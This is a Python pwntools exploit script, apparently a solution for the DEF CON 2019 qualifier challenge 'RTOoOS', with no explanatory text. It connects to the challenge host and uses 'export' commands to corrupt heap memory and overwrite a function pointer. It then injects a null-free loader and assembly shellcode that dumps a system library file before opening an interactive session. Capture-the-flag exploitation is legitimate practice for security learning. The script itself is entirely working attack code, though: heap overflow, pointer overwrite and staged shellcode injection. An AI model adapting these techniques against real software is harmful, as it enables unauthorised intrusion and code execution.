from pwn import *

def export(key,val):
	p.recvuntil("[RTOoOS> ")
	p.sendline("export {}={}".format(key,val))

def unset(key):
	p.recvuntil("[RTOoOS> ")
	p.sendline("unset {}".format(key))

def cat(fname):
	p.recvuntil("[RTOoOS> ")
	p.sendline("cat {}".format(fname))
	data = p.recvuntil("[RTOoOS> ").strip("[RTOoOS> ")
	return data

def env():
	p.recvuntil("[RTOoOS> ")
	p.sendline("env")
	data = p.recvuntil("[RTOoOS> ").strip("[RTOoOS> ").split("\n")
	ret = {}

	for x in data:
		if x=='':
			continue
		l = x.split("=")
		ret[l[0]]=l[1]

	p.sendline("ls")
	return ret
	
def main_shellcode():
	code = '''

	{}
	mov rdi,rsp
	call .cat
	call .crash

	.read:
		mov rax,rdi
		mov edi, 0x63
		out dx,al
		ret
	.putchar:
		mov rax,rdi
		mov edi, 0x61
		out dx,al
		ret
	.puts:
		mov rax,rdi
		mov edi, 0x64
		out dx,al
		ret
	.cat:
		mov rax,rdi
		mov edi,0x66
		out dx,al
		ret
	.leak:
		mov rax,rdi
		mov rdi,0x62
		out dx,al
		ret
	.ls:
		mov rax,rdi
		mov rdi,0x65
		out dx,al
		ret
	.crash:
		mov rsp,0x1029102910291
		push rax


	'''.format(shellcraft.amd64.pushstr("/usr/lib/libSystem.B.dylib\x00"))
	return asm(code)

def loader():
	code = '''
	xor rdi,rdi 
	mov di,0x13F0
	mov rax,rdi
	mov r15,rdi

	xor rdx,rdx
	mov dl,0x63
	mov rdi,rdx

	xor rsi,rsi
	mov si, {}

	out dx,al
	call r15
	jmp $
	'''.format(0x1FF)
	
	sc = asm(code)
	assert(not "\x00" in sc)
	return sc


if __name__ == "__main__":
	context.os = 'linux'
	context.arch = 'amd64'
	p = remote("rtooos.quals2019.oooverflow.io", 5000)
	p.recvuntil("Submission Stardate 37357.84908798814\n")
	log.info("connected, starting exploit")


	for i in range(1,6):
		export(str(i),"a"*0x1E0+"\x00")
		log.info("made chunk %d"%i)

	addr = 0x880 #check function
	export(str(6),"\xC0"*0x1E0+p16(addr)+"\x00") #overwrite pointer of 1
	export("7","1"*0x1a2+"$6")

	export("1",loader())

	p.sendline("cat honcho") # trigger loader
	sleep(0.5)
	log.info("triggering stager, sending shellcode")
	p.sendline(main_shellcode()) # read shellcode to stager
	
	data = p.recvall().replace("[RTOoOS> ","")

	f = open("libSystem.B.dylib","wb")
	f.write(data)
	f.close()

	p.interactive()